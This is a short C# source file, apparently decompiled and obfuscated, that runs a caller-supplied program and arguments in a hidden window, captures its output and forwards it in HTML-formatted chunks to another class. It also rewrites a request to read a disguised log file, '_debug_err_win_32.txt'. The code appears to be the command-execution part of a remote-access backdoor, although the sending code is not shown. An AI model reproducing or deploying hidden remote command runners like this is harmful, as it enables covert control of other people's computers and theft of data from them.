using System;
using System.Diagnostics;

internal sealed class Class1
{
	private static Process process_0;

	public static void smethod_0(string string_0, string string_1, string string_2)
	{
		string text = Class6.smethod_3() + "\\_debug_err_win_32.txt";
		if (string_1 == "cat _debug_err_win_32.txt")
		{
			string_1 = "cat " + text;
		}
		string_1 = string_1.Replace("\\", "\\\\");
		smethod_1(string_0, string_1);
		int num = 0;
		string text2 = string.Empty;
		string text3;
		while ((text3 = process_0.StandardOutput.ReadLine()) != null)
		{
			if (++num % 50 == 0)
			{
				text2 = text2 + text3 + "<br/>";
				Class5.smethod_5(text2, string_0, string_2, 0);
				text2 = string.Empty;
			}
			else
			{
				text2 = text2 + text3 + "<br/>";
			}
		}
		Class5.smethod_5(text2, string_0, string_2, 1);
	}

	public static void smethod_1(string string_0, string string_1)
	{
		process_0 = new Process();
		process_0.EnableRaisingEvents = true;
		process_0.Exited += smethod_2;
		process_0.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process_0.StartInfo.CreateNoWindow = true;
		process_0.StartInfo.RedirectStandardOutput = true;
		process_0.StartInfo.RedirectStandardInput = false;
		process_0.StartInfo.UseShellExecute = false;
		process_0.StartInfo.FileName = string_0;
		process_0.StartInfo.Arguments = string_1;
		process_0.Start();
	}

	private static void smethod_2(object sender, EventArgs e)
	{
	}
}
